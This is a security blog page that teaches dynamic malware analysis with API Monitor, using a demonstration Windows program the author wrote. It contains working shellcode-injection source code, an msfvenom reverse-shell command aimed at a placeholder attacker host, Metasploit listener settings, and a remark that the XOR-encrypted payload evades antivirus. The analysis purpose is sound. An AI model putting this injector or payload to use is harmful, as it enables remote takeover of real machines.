<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Dynamic analysis of malwares with API Monitor | Luhko</title>
<meta name="keywords" content="">
<meta name="description" content="This blog post aims to show how you can dynamically analyse Windows malwares using API Monitor.
One of the great benefits is that you can take a look at each API calls. You can even breakpoint on them, and edit the value before and after the call.
Custom malware For learning purpose, we will write a basic Windows malware which will:
 Check the presence of a hardcoded registry key. If not present, the execution is stopped.">
<meta name="author" content="">
<link rel="canonical" href="https://luhko.github.io/articles/dynamic_analysis_malwares_api_monitor/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.d7fb4cbf980fe688a21621b06a795933c4e6bb2d4070ec940667af1715d84af2.css" integrity="sha256-1/tMv5gP5oiiFiGwanlZM8Tmuy1AcOyUBmevFxXYSvI=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://luhko.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://luhko.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://luhko.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://luhko.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://luhko.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Dynamic analysis of malwares with API Monitor" />
<meta property="og:description" content="This blog post aims to show how you can dynamically analyse Windows malwares using API Monitor.
One of the great benefits is that you can take a look at each API calls. You can even breakpoint on them, and edit the value before and after the call.
Custom malware For learning purpose, we will write a basic Windows malware which will:
 Check the presence of a hardcoded registry key. If not present, the execution is stopped." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://luhko.github.io/articles/dynamic_analysis_malwares_api_monitor/" /><meta property="article:section" content="articles" />
<meta property="article:published_time" content="2023-12-17T21:44:49&#43;02:00" />
<meta property="article:modified_time" content="2023-12-17T21:44:49&#43;02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Dynamic analysis of malwares with API Monitor"/>
<meta name="twitter:description" content="This blog post aims to show how you can dynamically analyse Windows malwares using API Monitor.
One of the great benefits is that you can take a look at each API calls. You can even breakpoint on them, and edit the value before and after the call.
Custom malware For learning purpose, we will write a basic Windows malware which will:
 Check the presence of a hardcoded registry key. If not present, the execution is stopped."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Articles",
      "item": "https://luhko.github.io/articles/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Dynamic analysis of malwares with API Monitor",
      "item": "https://luhko.github.io/articles/dynamic_analysis_malwares_api_monitor/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Dynamic analysis of malwares with API Monitor",
  "name": "Dynamic analysis of malwares with API Monitor",
  "description": "This blog post aims to show how you can dynamically analyse Windows malwares using API Monitor.\nOne of the great benefits is that you can take a look at each API calls. You can even breakpoint on them, and edit the value before and after the call.\nCustom malware For learning purpose, we will write a basic Windows malware which will:\n Check the presence of a hardcoded registry key. If not present, the execution is stopped.",
  "keywords": [
    
  ],
  "articleBody": "This blog post aims to show how you can dynamically analyse Windows malwares using API Monitor.\nOne of the great benefits is that you can take a look at each API calls. You can even breakpoint on them, and edit the value before and after the call.\nCustom malware For learning purpose, we will write a basic Windows malware which will:\n Check the presence of a hardcoded registry key. If not present, the execution is stopped. Read an encrypted shellcode file, and decrypt it (using a simple XOR encryption). Inject the shellcode into a remote process.  Nothing really fancy and realistic, it’s just for demonstration purpose!\nThe source code is avaible in the Sources section, and here is a truncated output example targeting notepad.exe with PID 11816:\n[+] Key exists! Proceeding execution... [+] Got HANDLE on encrypted config file. [+] 460 bytes reads from file. --------- 41 F5 3E 59 4D 55 7D BD BD BD FC EC FC ED EF EC [...] [+] Decrypting ... --------- FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51 [...] D5 [+] Please enter the target process PID:  11816 [+] Injecting shellcode into remote process with PID 11816... [+] Press to run the payload... After a few seconds, we have our reverse shell on the attacking machine.\nPayload generation We first need to create our shellcode. We can do whatever we want, but for the next examples I will use a simple x64 reverse shell shellcode generated by msfvenom:\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=12345 -f raw reverse.bin You can then encrypt the shellcode, I used cyberchef to do it because it’s pretty simple:\nThen you can setup your MSF console with the following options:\n use exploit/multi/handler  set payload windows/x64/shell_reverse_tcp  set LPORT 12345  set LHOST attacker_ip Initial setup The initial setup is pretty straightforward. We can just launch the 64 bit version of API Monitor, and check all the API filters:\nIt will be very noisy, but we won’t miss anything in doing so. You can then uncheck some API, or check only the ones that you want if you know what you are looking for (e.g NTApi, processes API, etc.).\nAfter that, we just have to click on Monitor New Process, select our image, and click OK (the static import will be fine):\nEditing function return value At first, our malware will stop because it is looking for a registry key that does not exist. If we look for the API call in the list, we can find RegOpenKeyExA with the value it is looking for. We could create it, but instead we will “lie” to the malware. We need to set a breakpoint After Call on the API, and then launching again our malware.\nThis time, the breakpoint is hit. The return value is an ERROR code indicating that the registry key was not found.\nWe can just replace it by ERROR_SUCCESSand resume the execution.\nWe can confirm that the malware continued its execution because the first launch made 615 API calls, versus 1572+ API calls when we edited the return value:\nGetting the unencrypted shellcode Now, we want to get the shellcode (remember that it is encrypted). When the malware injects the shellcode into another process, it is the uncencrypted shellcode that is written in memory, so we can just look for a WriteProcessMemory call and check the buffer:\nAnd this is what the malware displayed at launch, so we have our shellcode.\nFC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51 [...] D5 If we submit the encrypted shellcode to VT, it is not flagged by any vendor:\nBut the original shellcode, not encrypted (we can save it from the WriteProcessMemory buffer), is flagged as malicious by 19 AV vendors:\nVictim process identification If we take a look at the OpenProcess call, used to get a HANDLEon a process, we can see that the process with PID 10008 is the target.\nWe can validate our findings by checking the PID 10008 opened connection with Process Explorer: notepad.exe opening a connection is indeed suspicious.\nIt is possible to ultimately confirm the infection using Process Hacker. If we look for a memory region with RWX protection (highly suspicious, again), then we can see that the memory is the unencrypted shellcode previously injected.\nConclusion The purpose of this post was to introduce API Monitor and some of its features that allow to work in a different way than with “traditional” debuggers. Having an higher point of view on the API calls (parameters value and names, error codes, etc.) can be really useful for every reverse engineering task. Hope it can help!\nSources API Monitor: http://www.rohitab.com/apimonitor\nCyberchef: https://gchq.github.io/CyberChef/\nMetasploit: https://www.metasploit.com/\nMalware source code:\n#include #include  #define BUFFER_SIZE 512 #define XOR_KEY 0xBD #define CONFIG_FILE_PATH \"C:\\\\reverse.bin\"  // Simple XOR encryption using a one byte key void XorOneByteKey(IN PBYTE pShellCode, IN SIZE_T sSize, IN BYTE bKey) { for (size_t i = 0; i  sSize; i++) { pShellCode[i] = pShellCode[i] ^ bKey; } } BOOL InjectShellCode(IN PBYTE pPayload, IN SIZE_T sPayloadLen) { PVOID pAddress = NULL; DWORD dwOldProtection, dwPid = NULL; SIZE_T dwBytes = 0; HANDLE hThread, hProcess = NULL; printf(\"\\n[+] Please enter the target process PID:\\n \"); scanf_s(\"%d\", \u0026dwPid); hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) { printf(\"[-] OpenProcess failed with error %d \\n\", GetLastError()); return FALSE; } printf(\"\\n[+] Injecting shellcode into remote process with PID %d...\\n\", dwPid); pAddress = VirtualAllocEx(hProcess, NULL, sPayloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pAddress == NULL) { printf(\"[-] VirtualAlloc failed with error: %d \\n\", GetLastError()); return FALSE; } if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadLen, \u0026dwBytes)) { printf(\"[-] WriteProcessMemory failed with error: %d \\n\", GetLastError()); return FALSE; } if (!VirtualProtectEx(hProcess, pAddress, sPayloadLen, PAGE_EXECUTE_READWRITE, \u0026dwOldProtection)) { printf(\"[-] VirtualProtect failed with error %d \\n\", GetLastError()); return FALSE; } printf(\"[+] Press to run payload...\\n\"); getchar(); hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, 0, NULL); if (hThread == NULL) { printf(\"[-] CreateRemoteThread failed with error %d \\n\", GetLastError()); return FALSE; } return TRUE; } BOOL ReadAndDecryptConfig() { HANDLE hFile = NULL; BYTE bData[BUFFER_SIZE] = { 0 }; DWORD dwRead = 0; hFile = CreateFileA(CONFIG_FILE_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (GetLastError() == ERROR_SUCCESS) { printf(\"[+] Got HANDLE on encrypted config file.\\n\"); if (ReadFile(hFile, \u0026bData, BUFFER_SIZE, \u0026dwRead, NULL)) { printf(\"[+] %d bytes reads from file.\\n--------- \\n\", dwRead); for (int i = 0; i  dwRead; i++) { printf(\"%02X \", bData[i]); } printf(\"\\n[+] Decrypting ...\\n--------- \\n\"); XorOneByteKey(bData, dwRead, XOR_KEY); for (int i = 0; i  dwRead; i++) { printf(\"%02X \", bData[i]); } InjectShellCode(bData, dwRead); return TRUE; } return FALSE; } return FALSE; } int main() { HKEY hKey = NULL; LONG lReturn; lReturn = RegOpenKeyExA(HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\super_secret_unguessable_value\", 0, KEY_READ, \u0026hKey); if (lReturn == ERROR_SUCCESS) { printf(\"[+] Key exists! Proceeding execution...\\n\"); ReadAndDecryptConfig(); return 0; } printf(\"[-] Key does not exists, aborting.\"); return 0; } ",
  "wordCount" : "1152",
  "inLanguage": "en",
  "datePublished": "2023-12-17T21:44:49+02:00",
  "dateModified": "2023-12-17T21:44:49+02:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://luhko.github.io/articles/dynamic_analysis_malwares_api_monitor/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Luhko",
    "logo": {
      "@type": "ImageObject",
      "url": "https://luhko.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://luhko.github.io/" accesskey="h" title="Luhko (Alt + H)">Luhko</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://luhko.github.io/articles" title="Articles">
                    <span>Articles</span>
                </a>
            </li>
            <li>
                <a href="https://luhko.github.io/write-up" title="Write-Up">
                    <span>Write-Up</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://luhko.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://luhko.github.io/articles/">Articles</a></div>
    <h1 class="post-title">
      Dynamic analysis of malwares with API Monitor
    </h1>
    <div class="post-meta"><span title='2023-12-17 21:44:49 +0200 +0200'>December 17, 2023</span>&nbsp;·&nbsp;6 min

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#custom-malware" aria-label="Custom malware">Custom malware</a></li>
                <li>
                    <a href="#payload-generation" aria-label="Payload generation">Payload generation</a></li>
                <li>
                    <a href="#initial-setup" aria-label="Initial setup">Initial setup</a></li>
                <li>
                    <a href="#editing-function-return-value" aria-label="Editing function return value">Editing function return value</a></li>
                <li>
                    <a href="#getting-the-unencrypted-shellcode" aria-label="Getting the unencrypted shellcode">Getting the unencrypted shellcode</a></li>
                <li>
                    <a href="#victim-process-identification" aria-label="Victim process identification">Victim process identification</a></li>
                <li>
                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li>
                <li>
                    <a href="#sources" aria-label="Sources">Sources</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>This blog post aims to show how you can dynamically analyse Windows malwares using <a href="http://www.rohitab.com/apimonitor">API Monitor</a>.</p>
<p>One of the great benefits is that you can take a look at each API calls. You can even breakpoint on them, and edit the value before and after the call.</p>
<h2 id="custom-malware">Custom malware<a hidden class="anchor" aria-hidden="true" href="#custom-malware">#</a></h2>
<p>For learning purpose, we will write a basic Windows malware which will:</p>
<ul>
<li>Check the presence of a hardcoded registry key. If not present, the execution is stopped.</li>
<li>Read an encrypted shellcode file, and decrypt it (using a simple XOR encryption).</li>
<li>Inject the shellcode into a remote process.</li>
</ul>
<p>Nothing really fancy and realistic, it’s just for demonstration purpose!</p>
<p>The source code is avaible in the <strong><strong><strong><strong><strong><strong><strong>Sources</strong></strong></strong></strong></strong></strong></strong> section, and here is a truncated output example targeting <code>notepad.exe</code> with PID 11816:</p>
<pre tabindex="0"><code>[+] Key exists! Proceeding execution...
[+] Got HANDLE on encrypted config file.
[+] 460 bytes reads from file.
---------
41 F5 3E 59 4D 55 7D BD BD BD FC EC FC ED EF EC [...]
[+] Decrypting ...
---------
FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51 [...] D5
[+] Please enter the target process PID:
&gt; 11816

[+] Injecting shellcode into remote process with PID 11816...
[+] Press &lt;ANY KEY&gt; to run the payload...
</code></pre><p>After a few seconds, we have our reverse shell on the attacking machine.</p>
<p><img loading="lazy" src="/api_monitor/Untitled.png" alt="Untitled"  />
</p>
<h2 id="payload-generation">Payload generation<a hidden class="anchor" aria-hidden="true" href="#payload-generation">#</a></h2>
<p>We first need to create our shellcode. We can do whatever we want, but for the next examples I will use a simple x64 reverse shell shellcode generated by <code>msfvenom</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>attacker_ip <span class="nv">LPORT</span><span class="o">=</span><span class="m">12345</span> -f raw reverse.bin
</code></pre></div><p>You can then encrypt the shellcode, I used <a href="https://gchq.github.io/CyberChef/">cyberchef</a> to do it because it’s pretty simple:</p>
<p><img loading="lazy" src="/api_monitor/Untitled%201.png" alt="Untitled"  />
</p>
<p>Then you can setup your MSF console with the following options:</p>
<pre tabindex="0"><code>&gt;&gt; use exploit/multi/handler
&gt;&gt; set payload windows/x64/shell_reverse_tcp
&gt;&gt; set LPORT 12345
&gt;&gt; set LHOST attacker_ip
</code></pre><h2 id="initial-setup">Initial setup<a hidden class="anchor" aria-hidden="true" href="#initial-setup">#</a></h2>
<p>The initial setup is pretty straightforward. We can just launch the 64 bit version of API Monitor, and check all the API filters:</p>
<p><img loading="lazy" src="/api_monitor/Untitled%202.png" alt="Untitled"  />
</p>
<p>It will be very noisy, but we won’t miss anything in doing so. You can then uncheck some API, or check only the ones that you want if you know what you are looking for (e.g NTApi, processes API, etc.).</p>
<p>After that, we just have to click on <em><strong><strong><strong><strong><strong><strong><strong><strong><strong>Monitor New Process</strong></strong></strong></strong></strong></strong></strong></strong></strong></em>, select our image, and click <strong>OK</strong> (the <em>static import</em> will be fine):</p>
<p><img loading="lazy" src="/api_monitor/Untitled%203.png" alt="Untitled"  />
</p>
<h2 id="editing-function-return-value">Editing function return value<a hidden class="anchor" aria-hidden="true" href="#editing-function-return-value">#</a></h2>
<p>At first, our malware will stop because it is looking for a registry key that does not exist. If we look for the API call in the list, we can find <code>RegOpenKeyExA</code> with the value it is looking for. We could create it, but instead we will “lie” to the malware. We need to set a breakpoint <em>After Call</em> on the API, and then launching again our malware.</p>
<p><img loading="lazy" src="/api_monitor/Untitled%204.png" alt="Untitled"  />
</p>
<p>This time, the breakpoint is hit. The return value is an ERROR code indicating that the registry key was not found.</p>
<p><img loading="lazy" src="/api_monitor/Untitled%205.png" alt="Untitled"  />
</p>
<p>We can just replace it by <code>ERROR_SUCCESS</code>and resume the execution.</p>
<p><img loading="lazy" src="/api_monitor/Untitled%206.png" alt="Untitled"  />
</p>
<p>We can confirm that the malware continued its execution because the first launch made 615 API calls, versus 1572+ API calls when we edited the return value:</p>
<p><img loading="lazy" src="/api_monitor/Untitled%207.png" alt="Untitled"  />
</p>
<p><img loading="lazy" src="/api_monitor/Untitled%208.png" alt="Untitled"  />
</p>
<h2 id="getting-the-unencrypted-shellcode">Getting the unencrypted shellcode<a hidden class="anchor" aria-hidden="true" href="#getting-the-unencrypted-shellcode">#</a></h2>
<p>Now, we want to get the shellcode (remember that it is encrypted). When the malware injects the shellcode into another process, it is the uncencrypted shellcode that is written in memory, so we can just look for a <code>WriteProcessMemory</code> call and check the buffer:</p>
<p><img loading="lazy" src="/api_monitor/Untitled%209.png" alt="Untitled"  />
</p>
<p>And this is what the malware displayed at launch, so we have our shellcode.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">FC <span class="m">48</span> <span class="m">83</span> E4 F0 E8 C0 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">41</span> <span class="m">51</span> <span class="m">41</span> <span class="m">50</span> <span class="m">52</span> <span class="m">51</span> <span class="o">[</span>...<span class="o">]</span> D5
</code></pre></div><p>If we submit the encrypted shellcode to VT, it is not flagged by any vendor:</p>
<p><img loading="lazy" src="/api_monitor/Untitled%2010.png" alt="Untitled"  />
</p>
<p>But the original shellcode, not encrypted (we can save it from the <code>WriteProcessMemory</code> buffer), is flagged as malicious by 19 AV vendors:</p>
<p><img loading="lazy" src="/api_monitor/Untitled%2011.png" alt="Untitled"  />
</p>
<h2 id="victim-process-identification">Victim process identification<a hidden class="anchor" aria-hidden="true" href="#victim-process-identification">#</a></h2>
<p>If we take a look at the <code>OpenProcess</code> call, used to get a <code>HANDLE</code>on a process, we can see that the process with PID <strong>10008</strong> is the target.</p>
<p><img loading="lazy" src="/api_monitor/Untitled%2012.png" alt="Untitled"  />
</p>
<p>We can validate our findings by checking the PID 10008 opened connection with <em><code>Process Explorer</code>:</em> <code>notepad.exe</code> opening a connection is indeed suspicious.</p>
<p><img loading="lazy" src="/api_monitor/Untitled%2013.png" alt="Untitled"  />
</p>
<p>It is possible to ultimately confirm the infection using <code>Process Hacker</code>. If we look for a memory region with <code>RWX</code> protection (highly suspicious, again), then we can see that the memory is the unencrypted shellcode previously injected.</p>
<p><img loading="lazy" src="/api_monitor/Untitled%2014.png" alt="Untitled"  />
</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>The purpose of this post was to introduce API Monitor and some of its features that allow to work in a different way than with “traditional” debuggers. Having an higher point of view on the API calls (parameters value and names, error codes, etc.) can be really useful for every reverse engineering task. Hope it can help!</p>
<h2 id="sources">Sources<a hidden class="anchor" aria-hidden="true" href="#sources">#</a></h2>
<p><strong>API Monitor:</strong> <a href="http://www.rohitab.com/apimonitor">http://www.rohitab.com/apimonitor</a></p>
<p><strong>Cyberchef:</strong> <a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p><strong>Metasploit:</strong> <a href="https://www.metasploit.com/">https://www.metasploit.com/</a></p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Malware source code:</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define BUFFER_SIZE 512
</span><span class="cp">#define XOR_KEY 0xBD
</span><span class="cp">#define CONFIG_FILE_PATH &#34;C:\\reverse.bin&#34;
</span><span class="cp"></span>
<span class="c1">// Simple XOR encryption using a one byte key
</span><span class="c1"></span><span class="kt">void</span> <span class="nf">XorOneByteKey</span><span class="p">(</span><span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pShellCode</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">sSize</span><span class="p">,</span> <span class="n">IN</span> <span class="n">BYTE</span> <span class="n">bKey</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">pShellCode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pShellCode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">bKey</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="nf">InjectShellCode</span><span class="p">(</span><span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pPayload</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">sPayloadLen</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">PVOID</span>    <span class="n">pAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">DWORD</span>    <span class="n">dwOldProtection</span><span class="p">,</span> <span class="n">dwPid</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">SIZE_T</span> <span class="n">dwBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[+] Please enter the target process PID:</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
	<span class="n">scanf_s</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwPid</span><span class="p">);</span>
	
	<span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">dwPid</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] OpenProcess failed with error %d </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[+] Injecting shellcode into remote process with PID %d...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dwPid</span><span class="p">);</span>

	<span class="n">pAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">sPayloadLen</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">pAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] VirtualAlloc failed with error: %d </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pAddress</span><span class="p">,</span> <span class="n">pPayload</span><span class="p">,</span> <span class="n">sPayloadLen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytes</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] WriteProcessMemory failed with error: %d </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pAddress</span><span class="p">,</span> <span class="n">sPayloadLen</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] VirtualProtect failed with error %d </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Press &lt;ANY KEY&gt; to run payload...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

	<span class="n">getchar</span><span class="p">();</span>

	<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] CreateRemoteThread failed with error %d </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="nf">ReadAndDecryptConfig</span><span class="p">()</span> <span class="p">{</span>

	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">BYTE</span> <span class="n">bData</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
	<span class="n">DWORD</span> <span class="n">dwRead</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

